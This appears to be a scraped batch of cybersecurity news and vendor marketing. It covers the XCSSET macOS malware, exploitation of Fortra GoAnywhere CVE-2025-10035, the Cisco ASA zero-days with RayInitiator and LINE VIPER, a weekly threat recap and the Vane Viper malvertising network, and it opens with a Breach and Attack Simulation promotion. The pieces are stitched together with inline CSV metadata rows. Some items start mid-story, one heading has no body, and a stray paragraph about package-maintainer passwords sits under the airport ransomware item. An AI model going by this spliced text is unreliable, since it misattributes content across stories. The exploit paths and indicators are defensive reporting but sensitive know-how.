Crash tests don't just expose flaws. They prove safety systems fire when they're needed most. Breach and Attack Simulation (BAS) does the same for enterprise security.
Instead of waiting for a real breach, BAS continuously runs safe, controlled attack scenarios that mirror how adversaries actually operate. It doesn't trade in hypotheticals, it delivers proof.
For CISOs, this proof matters because it turns anxiety into assurance:

No sleepless nights over a public CVE with a working proof-of-concept. BAS shows if your defenses stop it in practice.
No guessing whether the ransomware campaign sweeping your sector could penetrate your environment.BAS runs those behaviors safely and shows if you'd be a victim or not.
No fear of the unknown in tomorrow's threat reports. BAS validates defenses against both known techniques and emerging ones observed in the wild.

This is the discipline of Security Control Validation (SCV): proving that investments hold up where it counts. BAS is the engine that makes SCV continuous and scalable.
Dashboards may show posture. BAS reveals performance. By pointing out the blind spots in your defenses, it gives CISOs something dashboards never can: the ability to focus on the exposures that actually matter, and the confidence to prove resilience to boards, regulators, and customers.
Proof in Action: Effect of BAS in Business Side
BAS-driven exposure validation shows just how much noise can be eliminated when assumptions give way to proof:

Backlogs of 9,500 CVSS ""critical"" findings shrink to just 1,350 exposures proven relevant.
Mean Time to Remediate (MTTR) drops from 45 days to 13, closing windows of exposure before attackers can strike.
Rollbacks fall from 11 per quarter to 2, saving time, budget, and credibility.


And when paired with prioritization models like the Picus Exposure Score (PXS), the clarity becomes sharper:

From 63% of vulnerabilities flagged as high/critical, only 10% remain truly critical after validation, an 84% reduction in false urgency.

For CISOs, this means fewer sleepless nights over swelling dashboards and more confidence that resources are locked onto exposures that matter most. 
BAS turns overwhelming data into a validated risk picture executives can trust.
Closing Thought: Don't Just Monitor, Simulate
For CISOs, the challenge isn't visibility, it's certainty. Boards don't ask for dashboards or scanner scores. They want assurance that defenses will hold when it matters most.
This is where BAS reframes the conversation: from posture to proof.

From ""We deployed a firewall"" → to ""We proved it blocked malicious C2 traffic across 500 simulated attempts this quarter."" 
From ""Our EDR has MITRE coverage"" → to ""We detected 72% of emulated Scattered Spider APT group's behaviors; here's where we fixed the other 28%."" 
From ""We're compliant"" → to ""We're resilient, and we can prove it with evidence.""

That shift is why BAS resonates at the executive level. It transforms security from assumptions into measurable outcomes. Boards don't buy posture, they buy proof.
And BAS is evolving further. With AI, it's no longer just proving whether defenses worked yesterday, but anticipating how they will hold tomorrow.

To see this in action, join Picus Security, SANS, Hacker Valley, and other leading voices at The Picus BAS Summit 2025: Redefining Attack Simulation through AI. This virtual summit will showcase how BAS and AI together are shaping the future of security validation.

""This new variant of XCSSET brings key changes related to browser targeting, clipboard hijacking, and persistence mechanisms,"" the Microsoft Threat Intelligence team said in a Thursday report.
""It employs sophisticated encryption and obfuscation techniques, uses run-only compiled AppleScripts for stealthy execution, and expands its data exfiltration capabilities to include Firefox browser data. It also adds another persistence mechanism through LaunchDaemon entries.""
XCSSET is the name assigned to a sophisticated modular malware that's designed to infect Xcode projects used by software developers and unleash its malicious capabilities when it's being built. Exactly how the malware is distributed remains unclear, but it's suspected that the propagation relies on the Xcode project files being shared among developers building apps for macOS.
Earlier this March, Microsoft uncovered several enhancements to the malware, highlighting its improved error handling and the use of three different persistence techniques to siphon sensitive data from compromised hosts.

The latest variant of XCSSET has been found to incorporate a clipper sub-module that monitors clipboard content for specific regular expression (aka regex) patterns matching various cryptocurrency wallets. In the event of a match, the malware proceeds to substitute the wallet address in the clipboard with an attacker-controlled one to reroute transactions.
The Windows maker also noted that the new iteration introduces changes to the fourth stage of the infection chain, particularly where an AppleScript application is used to run a shell command to fetch the final-stage AppleScript that's responsible for collecting system information and launching various sub-modules using a boot() function.

Notably, the modifications include extra checks for the Mozilla Firefox browser and an altered logic to determine the presence of the Telegram messaging app. Also observed are changes to the various modules, as well as new modules that did not exist in previous versions -


vexyeqj, the information module previously called seizecj, and which downloads a module called bnk that's run using osascript. The script defines functions for data validation, encryption, decryption, fetching additional data from command-and-control (C2) server, and logging. It also includes the clipper functionality.
neq_cdyd_ilvcmwx, a module similar to txzx_vostfdi that exfiltrates files to the C2 server
xmyyeqjx, a module to set up LaunchDaemon-based persistence

iewmilh_cdyd, a module to steal data from Firefox using a modified version of a publicly available tool named HackBrowserData


To mitigate the threat posed by XCSSET, users are recommended to ensure that they keep their system up-to-date, inspect Xcode projects downloaded or cloned from repositories or other sources, and exercise caution when it comes to copying and pasting sensitive data from the clipboard.
Sherrod DeGrippo, Director of Threat Intelligence Strategy at Microsoft, told The Hacker News that the modules regularly undergo small name changes as the malware evolves, despite its functionality remaining consistent.
""What stands out in this variant is its ability to intercept and tamper with clipboard content tied to digital wallets,"" DeGrippo said. ""This isn't passive reconnaissance; it’s a threat that will undermine trust in something as basic as what you copy and paste. 
""The latest XCSSET evolution shows how even developer tools can be weaponized. With tactics like clipboard hijacking, expanded browser targeting, and stealth persistence, threat actors continue to raise the level of sophistication defenders need to guard against.""

2025-10-06 11:12:19,"Sep 26, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/09/fortra-goanywhere-cvss-10-flaw.html,Fortra GoAnywhere CVSS 10 Flaw Exploited as 0-Day a Week Before Public Disclosure,"Cybersecurity company watchTowr Labs has disclosed that it has ""credible evidence"" of active exploitation of the recently disclosed security flaw in Fortra GoAnywhere Managed File Transfer (MFT) software as early as September 10, 2025, a whole week before it was publicly disclosed.
""This is not 'just' a CVSS 10.0 flaw in a solution long favored by APT groups and ransomware operators – it is a vulnerability that has been actively exploited in the wild since at least September 10, 2025,"" Benjamin Harris, CEO and Founder of watchTowr, told The Hacker News.
The vulnerability in question is CVE-2025-10035, which has been described as a deserialization vulnerability in the License Servlet that could result in command injection without authentication. Fortra GoAnywhere version 7.8.4, or the Sustain Release 7.6.3, was released by Fortra last week to remediate the problem.

According to an analysis released by watchTowr earlier this week, the vulnerability has to do with the fact that it's possible to send a crafted HTTP GET request to the ""/goanywhere/license/Unlicensed.xhtml/"" endpoint to directly interact with the License Servlet (""com.linoma.ga.ui.admin.servlet.LicenseResponseServlet"") that's exposed at ""/goanywhere/lic/accept/<GUID>"" using the GUID embedded in the response to the earlier sent request.
Armed with this authentication bypass, an attacker can take advantage of inadequate deserialization protections in the License Servlet to result in command injection. That said, exactly how this occurs is something of a mystery, researchers Sonny Macdonald and Piotr Bazydlo noted.
Cybersecurity vendor Rapid7, which also released its findings into CVE-2025-10035, said it's not a single deserialization vulnerability, but rather a chain of three separate issues -

An access control bypass that has been known since 2023
The unsafe deserialization vulnerability CVE-2025-10035, and 
An as-yet unknown issue pertaining to how the attackers can know a specific private key


In a subsequent report published Thursday, watchTowr said it received evidence of exploitation efforts, including a stack trace, that enables the creation of a backdoor account. The sequence of the activity is as follows -

Triggering the pre-authentication vulnerability in Fortra GoAnywhere MFT to achieve remote code execution (RCE)
Using the RCE to create a GoAnywhere user named ""admin-go""
Using the newly created account to create a web user
Leveraging the web user to interact with the solution and upload and execute additional payloads, including SimpleHelp and an unknown implant (""zato_be.exe"")


The cybersecurity company also said the threat actor activity originated from the IP address 155.2.190[.]197, which, according to VirusTotal, has been flagged for conducting brute-force attacks targeting Fortinet FortiGate SSL VPN appliances in early August 2025. However, watchTowr told The Hacker News that it has not observed any such activity from the IP address against its honeypots.
Given signs of in-the-wild exploitation, it's imperative that users move quickly to apply the fixes, if not already. The Hacker News has reached out to Fortra for comment, and we will update the story if we hear back.
Update
The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has formally confirmed active exploitation of CVE-2025-10035, requiring federal agencies to apply the fixes by October 20, 2025.
""We continue to be confused as to why Fortra is not advising customers of what appears to be clear evidence of in-the-wild exploitation since at least September 10th,"" Benjamin Harris, CEO and Founder of watchTowr, said in a statement.
""CISA's addition of these vulnerabilities to the exclusive KEV list only adds to this confusion. We urge Fortra to share their viewpoint and would encourage customers to ask Fortra what they should be doing with regards to patching cycles. Is this urgent, or can it wait until Christmas?""
""In-the-wild exploitation aside, the mystery surrounding this vulnerability remains. Per part 1 of our analysis, we are unclear how exploitation of this vulnerability is possible unless a few very scary scenarios have played out – including attackers gaining control over private keys owned by Fortra. Now that in-the-wild exploitation is confirmed by CISA, this mystery only grows.""
When reached for comment, Fortra shared the below statement with The Hacker News -
CVE-2025-10035 is primarily relevant to organizations with a GoAnywhere admin console exposed to the internet. Upon identifying the vulnerability, we immediately notified those customers and continue to provide direct updates and support. Our investigation is ongoing, and our security advisory outlines what organizations need to know based on current findings. We will provide additional information as it becomes available.
(The story was updated after publication on September 30, 2025, to reflect confirmation from CISA on the active exploitation status.)"
2025-10-06 11:12:23,"Sep 26, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/09/cisco-asa-firewall-zero-day-exploits.html,Cisco ASA Firewall Zero-Day Exploits Deploy RayInitiator and LINE VIPER Malware,"The U.K. National Cyber Security Centre (NCSC) has revealed that threat actors have exploited the recently disclosed security flaws impacting Cisco firewalls as part of zero-day attacks to deliver previously undocumented malware families like RayInitiator and LINE VIPER.
""The RayInitiator and LINE VIPER malware represent a significant evolution on that used in the previous campaign, both in sophistication and its ability to evade detection,"" the agency said.
Cisco on Thursday revealed that it began investigating attacks on multiple government agencies linked to the state-sponsored campaign in May 2025 that targeted Adaptive Security Appliance (ASA) 5500-X Series devices to implant malware, execute commands, and potentially exfiltrate data from the compromised devices.
An in-depth analysis of firmware extracted from the infected devices running Cisco Secure Firewall ASA Software with VPN web services enabled ultimately led to the discovery of a memory corruption bug in the product software, it added.
""Attackers were observed to have exploited multiple zero-day vulnerabilities and employed advanced evasion techniques such as disabling logging, intercepting CLI commands, and intentionally crashing devices to prevent diagnostic analysis,"" the company said.

The activity involves the exploitation of CVE-2025-20362 (CVSS score: 6.5) and CVE-2025-20333 (CVSS score: 9.9) to bypass authentication and execute malicious code on susceptible appliances. The campaign is assessed to be linked to a threat cluster dubbed ArcaneDoor, which was attributed to a suspected China-linked hacking group known as UAT4356 (aka Storm-1849).
Additionally, in some cases, the threat actor is said to have modified ROMMON (short for Read-Only Memory Monitor) – which is responsible for managing the boot process and performing diagnostic tests in ASA devices – to facilitate persistence across reboots and software upgrades. That being said, these modifications have been detected only on Cisco ASA 5500-X Series platforms that lack Secure Boot and Trust Anchor technologies.

Cisco also said the campaign has successfully compromised ASA 5500-X Series models running Cisco ASA Software releases 9.12 or 9.14 with VPN web services enabled, and which do not support Secure Boot and Trust Anchor technologies. All the affected devices have reached end-of-support (EoS) or are about to reach EoS status by next week -

5512-X and 5515-X – Last Date of Support: August 31, 2022
5585-X – Last Date of Support: May 31, 2023
5525-X, 5545-X, and 5555-X – Last Date of Support: September 30, 2025

Furthermore, the company noted that it has addressed a third critical flaw (CVE-2025-20363, CVSS score: 8.5/9.0) in the web services of Adaptive Security Appliance (ASA) Software, Secure Firewall Threat Defense (FTD) Software, IOS Software, IOS XE Software, and IOS XR Software that could allow an remote attacker to execute arbitrary code on an affected device.
""An attacker could exploit this vulnerability by sending crafted HTTP requests to a targeted web service on an affected device after obtaining additional information about the system, overcoming exploit mitigations, or both,"" it said. ""A successful exploit could allow the attacker to execute arbitrary code as root, which may lead to the complete compromise of the affected device.""
Unlike CVE-2025-20362 and CVE-2025-20333, there is no evidence that the vulnerability has been exploited in the wild in a malicious context. Cisco said the shortcoming was discovered by the Cisco Advanced Security Initiatives Group (ASIG) during the resolution of a Cisco TAC support case.
The Canadian Centre for Cyber Security has urged organizations in the country to take action as soon as possible to counter the threat by updating to a fixed version of Cisco ASA and FTD products.
The U.K. NCSC, in an advisory released September 25, revealed the attacks have leveraged a multi-stage bootkit called RayInitiator to deploy a user-mode shellcode loader known as LINE VIPER to the ASA appliance.

RayInitiator is a persistent GRand Unified Bootloader (GRUB) bootkit that's flashed to victim devices, while capable of surviving reboots and firmware upgrades. It's responsible for loading into memory LINE VIPER, which can run CLI commands, perform packet captures, bypass VPN Authentication, Authorization, and Accounting (AAA) for actor devices, suppress syslog messages, harvest user CLI commands, and force a delayed reboot.
The bootkit accomplishes this by installing a handler within a legitimate ASA binary called ""lina"" to execute LINE VIPER. Lina, short for Linux-based Integrated Network Architecture, is the operating system software that integrates core firewall functionalities of the ASA.
Described as ""more comprehensive"" than Line Dancer, LINE VIPER uses two methods for communication with the command-and-control (C2) server: WebVPN client authentication sessions over HTTPS, or via ICMP with responses over raw TCP. It's also designed to make a number of modifications to ""lina"" to avoid leaving a forensic trail and prevent detection of modifications to CLI commands like copy and verify.
""The deployment of LINE VIPER via a persistent bootkit, combined with a greater emphasis on defence evasion techniques, demonstrates an increase in actor sophistication and improvement in operational security compared to the ArcaneDoor campaign publicly documented in 2024,"" the NCSC said."
2025-10-06 11:12:24,"Sep 25, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/09/urgent-cisco-asa-zero-day-duo-under.html,Urgent: Cisco ASA Zero-Day Duo Under Attack; CISA Triggers Emergency Mitigation Directive,"Cisco is urging customers to patch two security flaws impacting the VPN web server of Cisco Secure Firewall Adaptive Security Appliance (ASA) Software and Cisco Secure Firewall Threat Defense (FTD) Software, which it said have been exploited in the wild.
The zero-day vulnerabilities in question are listed below -

CVE-2025-20333 (CVSS score: 9.9) - An improper validation of user-supplied input in HTTP(S) requests vulnerability that could allow an authenticated, remote attacker with valid VPN user credentials to execute arbitrary code as root on an affected device by sending crafted HTTP requests
CVE-2025-20362 (CVSS score: 6.5) - An improper validation of user-supplied input in HTTP(S) requests vulnerability that could allow an unauthenticated, remote attacker to access restricted URL endpoints without authentication by sending crafted HTTP requests

Cisco said it's aware of ""attempted exploitation"" of both vulnerabilities, but did not reveal who may be behind it, or how widespread the attacks are. It's suspected that the two vulnerabilities are being chained to bypass authentication and execute malicious code on susceptible appliances.

It also credited the Australian Signals Directorate, Australian Cyber Security Centre (ACSC), Canadian Centre for Cyber Security, U.K. National Cyber Security Centre (NCSC), and U.S. Cybersecurity and Infrastructure Security Agency (CISA) for supporting the investigation.
CISA Issues Emergency Directive ED 25-03
In a separate alert, CISA said it's issuing an emergency directive urging federal agencies to identify, analyze, and mitigate potential compromises with immediate effect. In addition, both vulnerabilities have been added to the Known Exploited Vulnerabilities (KEV) catalog, giving the agencies 24 hours to apply the necessary mitigations.
""CISA is aware of an ongoing exploitation campaign by an advanced threat actor targeting Cisco Adaptive Security Appliances (ASA),"" the agency noted.
""The campaign is widespread and involves exploiting zero-day vulnerabilities to gain unauthenticated remote code execution on ASAs, as well as manipulating read-only memory (ROM) to persist through reboot and system upgrade. This activity presents a significant risk to victim networks.""
The agency also noted that the activity is linked to a threat cluster dubbed ArcaneDoor, which was previously identified as targeting perimeter network devices from several vendors, including Cisco, to deliver malware families like Line Runner and Line Dancer. The activity was attributed to a threat actor codenamed UAT4356 (aka Storm-1849).
""This threat actor has demonstrated a capability to successfully modify ASA ROM at least as early as 2024,"" CISA added. ""These zero-day vulnerabilities in the Cisco ASA platform are also present in specific versions of Cisco Firepower. Firepower appliances' Secure Boot would detect the identified manipulation of the ROM."""

Texts laid bare
Unpatched Flaw in OnePlus Phones Lets Malicious Apps Access Text Messages
A permission bypass vulnerability (CVE-2025-10184, CVSS score: 8.2) has been discovered in multiple versions of OnePlus OxygenOS installed on its Android devices. The shortcoming has to do with the fact that sensitive internal content providers are accessible without permission, and are vulnerable to SQL injection. ""When leveraged, the vulnerability allows any application installed on the device to read SMS/MMS data and metadata from the system-provided Telephony provider (the package com.android.providers.telephony) without permission, user interaction, or consent,"" Rapid7 said. ""The user is also not notified that SMS data is being accessed."" Successful exploitation of the flaw could lead to the theft of sensitive information, such as multi-factor authentication (MFA) codes sent as SMS messages. The issue appears to have been introduced as part of OxygenOS 12, released in 2021. The vulnerability remains unpatched as of writing, but OnePlus has acknowledged it's investigating the issue.

GeoServer hole exploited
CISA says Hackers Breached Federal Agency Using GeoServer Exploit
The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has released a comprehensive cybersecurity advisory detailing how threat actors successfully compromised a U.S. federal civilian executive branch agency's network on July 11, 2024, by exploiting CVE-2024-36401, a critical remote code execution vulnerability in GeoServer. ""Over the three-week period, the cyber threat actors gained separate initial access to a second GeoServer via the same vulnerability and moved laterally to two other servers,"" the agency said. Once compromised, the attackers uploaded (or attempted to upload) web shells such as China Chopper, along with scripts designed for remote access, persistence, command execution, and privilege escalation. The cyber threat actors also used living-off-the-land (LotL) techniques for user, service, filesystem, and network discovery, while relying on tools like fscan, dirtycow, and RingQ for network reconnaissance, privilege escalation, and defense evasion, respectively.






SIM-swapping secrets spill
Confessions of Scattered Spider's Noah Urban
Last week, three members of the notorious cybercrime group Scattered Spider were arrested. The arrests came close on the heels of the crew announcing that it was shuttering its operations. The group, composed of primarily English-speaking teenagers, are known to carry out hacking sprees using advanced social engineering tactics to breach high-profile companies, steal data, and extort them. Earlier this year, Noah Urban, a 20-year-old linked to the notorious group, pled guilty to his cybercrime charges and agreed to pay millions in restitution. In a report published last week, Bloomberg revealed his critical role as a caller, talking people into unwittingly giving them access to sensitive computer systems by installing remote access tools. He also said he found a SIM-swapping group through Minecraft, the leader of which paid him $50 each time a call resulted in a cryptocurrency theft. Urban also said one of the collaborators, Daniel Junk, figured out a way to access T-Mobile's customer service portal by registering his personal computer to its corporate network and using remote access software to get into the company's SIM activation tool. Junk is said to have paid Urban to call T-Mobile stores and deceive staff into handing over their logins by claiming to be from the internal security management. Soon Urban graduated to employing his own callers to conduct SIM swapping and used fake Okta login pages masquerading to trick a Twilio employee into sending their credentials. But when that account didn't have the data he wanted, he logged into the employee's Slack account and messaged a senior employee he'd identified on LinkedIn, asking them to send customer data belonging to 209 companies for auditing purposes. The information was subsequently used to hack more companies. In December 2022, the group also stole the personal information of 5.7 million customers of Gemini Trust and put it up for sale. This activity cluster came to be known as 0ktapus. The threat group would eventually join hands with other entities like LAPSUS$ and Scattered Spider to breach Crypto.com and exploit a United Parcel Service Inc. system to gather the personal data of would-be victims. Urban's home was raided by U.S. authorities in March 2023, and he was eventually arrested in January 2024. Last month, he was sentenced to ten years in prison. ""I'm not saying what I did was a good thing, it's a horrible community, and what I did was bad,"" he told Bloomberg. ""But I loved my life. I like who I am. I'm glad I was able to live life as I lived it.""





Stealthy SVG stings
Oversized SVG Files Used to Deliver AsyncRAT
Threat actors are using booby-trapped SVG files in an email phishing campaign targeting users in Colombia, Mexico, and Peru as a delivery vector to stealthily deliver malware like AsyncRAT by means of a password-protected ZIP archive. The oversized SVG files contain the ""full package,"" eliminating the need for external connections to a remote server in order to send commands to compromised devices or download additional malicious payloads. ""Attackers also appear to rely at least partly on artificial intelligence (AI) tools to help them generate customized files for every target,"" ESET said. ""The ability of SVG lures to carry scripts, embedded links and interactive elements makes them ripe for abuse, all while increasing the odds of evading detection by some traditional security tools.""





Right-to-left ruse
BiDi Swap Leads to URL Spoofing
A decade-old vulnerability can open the door to URL spoofing by exploiting how browsers handle Right-to-Left (RTL) and Left-to-Right (LTR) scripts, thereby allowing attackers to craft URLs that appear trustworthy but actually lead to a different destination. The attack has been codenamed BiDi Swap by Varonis. While punycode homograph attacks and RTL override (RLO) exploits have long been abused to deceive users and browsers into displaying deceptive text or URLs, BiDi Swap entails crafting domains that have LTR sub-domain with some RTL parameters to spoof legitimate sites.





Self-replicating supply-chain menace
CISA Releases Alert on Shai-Hulud Attack
CISA has published an advisory on the recent widespread supply chain compromise targeting the npm ecosystem that involved the use of a self-replicating worm named Shai-Hulud to steal credentials and propagate the malware to other packages. The malware ""leveraged an automated process to rapidly spread by authenticating to the npm registry as the compromised developer, injecting code into other packages, and publishing compromised versions to the registry,"" CISA said. The agency is urging organizations to conduct a dependency review, pin npm package dependency versions to known safe releases, rotate all developer credentials, mandate phishing-resistant multi-factor authentication (MFA) on all developer accounts, monitor for anomalous network behavior, harden GitHub security by removing unnecessary GitHub Apps and OAuth applications, and enable branch protection rules. ""The Shai-Hulud worm represents a significant escalation in the ongoing series of NPM attacks targeting the open-source community,"" Palo Alto Networks Unit 42 said. ""Its self-replicating design is particularly notable, effectively combining credential harvesting with an automated dissemination mechanism that exploits maintainers' existing publishing rights to proliferate across the ecosystem.""





Game patch turns thief
BlockBlasters Game Delivers StealC Malware
A 2D platformer game called BlockBlasters has begun to exhibit signs of malicious activity after a patch release on August 30, 2025, that silently captures system information, a list of installed security products, and cryptocurrency wallet browser extensions, and drops the StealC information stealer while the user is playing the game. This patch affects hundreds of players who currently have the game installed on their systems, G DATA said. The game has since been pulled from Steam.





Database door unlocked

Basic ransomware, big chaos
West Sussex Man Arrested in Connection with Cyber Attack Affecting Airports
A man in his forties from West Sussex has been arrested in connection with a cyber attack that disrupted day-to-day operations at several European airports including Heathrow. The U.K. National Crime Agency (NCA) said he has been released on conditional bail. ""Although this arrest is a positive step, the investigation into this incident is in its early stages and remains ongoing,"" Deputy Director Paul Foster, head of the NCA's National Cyber Crime Unit, said. The agency did not name the suspect or say whether he acted alone or as part of a wider cybercriminal group. The incident caused hundreds of flight delays after Collins Aerospace baggage and check-in software used by several airlines failed. RTX Corporation, the owner of Collins Aerospace, said ransomware had been deployed in the attack. Although the company did not share any other details regarding the incident, cybersecurity researcher Kevin Beaumont said the attackers used an ""incredibly basic"" ransomware variant called HardBit.

Package maintainers are advised to change their passwords with immediate effect if they have already clicked on the link and provided their login information. It's also advised to check the account's Security History for any suspicious activity.





French dark market falls
France Seizes Dark French Anti System
Law enforcement authorities in French have shut down a dark web marketplace catering to French-speaking users. The Dark French Anti System, or DFAS, was established in 2017 and had more than 12,000 registered users, emerging as a major hub for peddling drugs, arms, hacking tools, money-laundering schemes, and other criminal services. Authorities took control of servers and arrested two suspects, one who is alleged to be the site's chief administrator and an accomplice who helped in the testing of its services.





Global sting hauls millions
INTERPOL Announces $439 million Recovery
An INTERPOL-coordinated operation spanning 40 countries and territories led to the recovery of USD 342 million in government-backed currencies, along with USD 97 million in physical and virtual assets. The operation, dubbed HAECHI-VI, took place between April and August 2025, and targeted seven types of cyber-enabled financial crimes: voice phishing, romance scams, online sextortion, investment fraud, money laundering associated with illegal online gambling, business email compromise and e-commerce fraud. As part of the ongoing effort, authorities blocked over 68,000 associated bank accounts, froze close to 400 cryptocurrency wallets, and recovered around $16 million in suspected illicit profits from cryptocurrency wallets. In addition, Portuguese law enforcement broke up a syndicate that diverted funds meant to support vulnerable families, leading to the arrest of 45 suspects who illegally accessed social security accounts and altered bank details that resulted in $270,000 stolen from 531 victims. Thai officials also seized $6.6 million in stolen assets in connection with a sophisticated business email compromise scam conducted by a transnational organized crime group comprising Thai and West African nationals. ""The gang deceived a major Japanese corporation into transferring funds to a fictitious business partner based in Bangkok,"" INTERPOL said.





Kids' data under spotlight
TikTok Comes Under Scrutiny in Canada for Collecting Children Data
The popular social media app TikTok has been collecting sensitive information from hundreds of thousands of Canadians under 13 years old, according to a joint investigation by privacy authorities. However, ""as a result of TikTok's inadequate age-assurance measures, the company collected the personal information of a large number of Canadian children, including information that the offices consider to be sensitive,"" the report said. The probe also found TikTok failed to adequately explain its collection and use of biometric information, such as facial and voice data, for video, image and audio analysis. The privacy commissioners said TikTok agreed to enhance its age verification and provide up-front notices about its wide-ranging collection of data. The company also agreed to ""effectively stop"" allowing advertisers to target users under the age of 18, except based on broad categories such as language and approximate location.





AI turbocharges vulnerabilities
AI Coding Assistants Ship With More Risks
A new report from Apiiro has found that software development teams using artificial intelligence (AI)-powered coding assistants have introduced ""over 10,000 new security findings per month across repositories,"" a 10× spike from December 2024. ""These flaws span every category of application risk — from open-source dependencies to insecure coding patterns, exposed secrets, and cloud misconfigurations,"" Apiiro said. ""AI is multiplying not one kind of vulnerability, but all of them at once."" The study also found that while syntax errors in AI-written code dropped by 76% and logic bugs declined by more than 60%, privilege escalation paths jumped 322%, and architectural design flaws increased 153%. In addition, AI-assisted developers exposed cloud-related API keys and service principals nearly twice as often as their non-AI peers.





Shortcut to bypass security
LNK Stomping Detailed
In September 2024, Microsoft issued patches for a Windows Mark-of-the-Web (MotW) security feature bypass vulnerability tracked as CVE-2024-38217. Also called LNK Stomping, the flaw exploits the manner Windows shortcut (LNK) files are handled to remove the MotW tag and bypass security protections. According to Elastic, there are indications that the issue has been exploited as far back as February 2018, long before it was publicly documented. ""LNK Stomping is an attack that manipulates the actual execution program path of a Windows shortcut file (.lnk) with an abnormal target path or internal structure,"" South Korean cybersecurity company ASEC said. ""It then prompts explorer.exe to remove the MoTW metadata during the 'normalization (Canonicalization)' process, thereby bypassing security checks.""





BankBot strikes Southeast Asia
Indonesian and Vietnamese Android Users Targeted by Banking Trojans
DomainTools revealed that Indonesian and Vietnamese Android users have been targeted by banking trojans disguised as legitimate payment and government identity applications since August 2024. ""The operators exhibit distinct domain registration patterns, often reusing TLS certificates and grouping domains to resolve to the same IP addresses, with a strong operational focus during Eastern Asia's daytime hours,"" the company said. It's suspected that the threat actors are using spoofed websites imitating the Google Play Store to trick users into installing fraudulent APK files that drop a banking trojan named BankBot, which had its source code leaked on Russian-language forums in 2016. Over 100 domains have been identified as being used for malware distribution.





Russian influence playbook
New Disinformation Campaign Targeting 2025 Moldovan Elections
A state-backed threat actor with ties to Russian is targeting the upcoming 2025 Moldovan elections with a disinformation campaign, setting up fake news sites to publish articles that amplify narratives attempting to dissuade Moldova from further aligning with the European Union and exhibit bias against the current leadership. The multi-year activity is tracked under the name Storm-1679 (aka Matryoshka). Silent Push said it identified ""technical fingerprints"" linking the efforts to a Russian news site named Absatz. It also found commonalities between multiple disinformation websites, suggesting ""infrastructure reuse and common ownership across this campaign."" This includes the use of two IP addresses -- 95.181.226[.]135 and 91.218.228[.]51 -- which have been used to host domains in connection with a Russian disinformation effort dating back to 2022. ""When searching for the Russian word for Moldova ('Молдова') on Absatz (absatz[.]media/search), there are dozens of clear disinformation articles,"" Silent Push said.

2025-10-06 11:12:29,"Sep 25, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/09/vane-viper-generates-1-trillion-dns.html,Vane Viper Generates 1 Trillion DNS Queries to Power Global Malware and Ad Fraud Network,"The threat actor known as Vane Viper has been outed as a purveyor of malicious ad technology (adtech), while relying on a tangled web of shell companies and opaque ownership structures to deliberately evade responsibility.
""Vane Viper has provided core infrastructure in widespread malvertising, ad fraud, and cyberthreat proliferation for at least a decade,"" Infoblox said in a technical report published last week in collaboration with Guardio and Confiant.
""Vane Viper not only brokers traffic for malware droppers and phishers, but appears to run their own campaigns, consistent with previously documented ad-fraud techniques.""
Vane Viper, also called Omnatuor, was previously documented by the DNS threat intelligence firm in August 2022, describing it as a malvertising network akin to VexTrio Viper that takes advantage of vulnerable WordPress sites to build a massive network of compromised domains and use them to spread riskware, spyware, and adware.

One of the notable aspects of the threat actor's persistence techniques is the abuse of push notification permissions to serve ads even after the user navigates away from the initial page by altering browser settings. This approach relies on service workers, which maintain a persistent headless browser process to listen for events and serve unwanted notifications.
Late last year, Guardio Labs laid bare a campaign dubbed DeceptionAds that was found to leverage Vane Viper's malicious ad network to facilitate ClickFix-style social engineering campaigns. The activity was attributed to a company named Monetag, which, according to Infoblox, is a subsidiary of PropellerAds, a commercial ad technology company that, in turn, is a subsidiary of AdTech Holding, a holding company based in Cyprus.

Domains linked to ProperllerAds have long been flagged for facilitating malvertising campaigns and driving traffic to exploit kits or other fraudulent sites. Further analysis has uncovered evidence suggesting that several ad-fraud campaigns have originated from infrastructure attributed to PropellerAds.
The cybersecurity company said Vane Viper has accounted for about 1 trillion DNS queries over the past year in about half of its customer networks, adding the threat actor takes advantage of hundreds of thousands of compromised websites and malicious ads that redirect unsuspecting site users to malicious browser extensions, fake shopping sites, adult content, survey scams, fake apps, sketchy software downloads, and malware, including an Android malware called Triada in one case.
What's more, Vane Viper appears to share infrastructure and personnel ties with URL Solutions (aka Pananames), Webzilla, and XBT Holdings, with the former also linked to disinformation sites set up by a Russian influence operation called Doppelgänger. Some of the other companies owned by AdTech Holding include ProPushMe, Zeydoo, Notix, and Adex.

About 60,000 domains are assessed to be part of Vane Viper's infrastructure, most of which only remain active for less than a month. However, there are a few domains that have been active for over 1,200 days, including the original omnatuor[.]com, propeller-tracking[.]com, and several others centered around push notification services.
The operation has been found to register vast numbers of new domains each month, scaling a high of 3,500 domains in the month of October 2024 alone, a significant jump from less than 500 domains registered in April 2023. Vane Viper domains make up nearly 50% of bulk-registered domains via URL Solutions since 2023, per the company.
PropellerAds, however, has previously denied any wrongdoing, stating it's ""nothing more than an automated intermediary to help advertisers find the best publishers to publish their advertisements,"" and that it ""does not endorse, support, or encourage any malicious advertisement on its network.""
""Vane Viper isn't just a threat actor hiding behind an adtech platform,"" Infoblox noted. ""It's a threat actor as an adtech platform. AdTech Holding claims to offer advertisers reach and monetization at scale, but what it actually delivers is risk.""
""Vane Viper hides behind the plausible deniability of operating as an advertising network, while using their TDS [traffic distribution system] to deliver multiple kinds of threats."""

However, just a few weeks later, the collective published a goodbye letter on Telegram and the Dark Web marketplace BreachForums, saying the three groups, as well as other threat actors, had ""decided to go dark.""But Scattered Lapsus$ Hunters burst back into the limelight this week with a Dark Web leak site devoted to the recent spate of Salesforce data thefts; one of the two distinct campaigns targeting Salesforce environments recently has been attributed to a threat group tracked by Google as UNC6040, which has claimed to be ShinyHunters in its extortion attempts.According to Google, UNC6040 actors used vishing calls to convince IT support personnel at targeted organizations to grant them access to or credentials for the organizations' Salesforce environments. Mandiant researchers this week said the threat actors have impersonated third-party vendors in the vishing calls and had also targeted users in victim organizations with elevated access to other SaaS applications.Related:Dutch Authorities Arrest Two Teens for Alleged Pro-Russian EspionageThe leak site claims to have approximately 1 billion records, with 39 victim organizations listed with sample data. The site declared a deadline of Oct. 10 for Salesforce, with a threat to publish all stolen data if its demands are not met.""Contact us to negociate [sic] this ransom or all your customers data will be leaked,"" the group says on the site. ""If we come to a resolution all individual extortions again your customers will be withdrawn from. Nobody else will have to pay us, if you pay, Salesforce, Inc.""In response, Salesforce issued a statement on its status update site. ""We are aware of recent extortion 